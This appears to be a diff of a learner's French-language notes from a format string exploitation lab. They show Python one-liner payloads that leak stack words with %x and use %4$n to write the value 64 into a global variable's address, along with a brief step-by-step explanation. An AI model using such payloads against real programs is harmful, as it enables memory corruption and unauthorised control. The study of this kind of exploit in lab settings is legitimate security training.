@@ -1,3 +1,8 @@
 echo AAAA$(python -c 'print "%08x."*20')
 
-echo $(python -c "print 'A' * 60 + '\x8c\x98\x04\x08' + '%x ' * 20 + '%n'") print 64 chars + %n a l addresse de _m (globale nin initialisee donc dans bss)
+echo $(python -c "print '\x8c\x98\x04\x08' + 'a' * 60 + '%4\$n'") change la data a l adresse en 1e position par le nb de caracteres imprimes par pf
+
+donc on veut imprimer 64 chars puis mettre 64 dans la case memoire de la var comparee
+d abord on regarde avec %x.%x jusqu a tomber sur la case memoire qu on controle
+
+ca donne 1 addresse 2 nb de chars a mettre 3 ecrire dans la case memoire qu on controle la valeur demandee
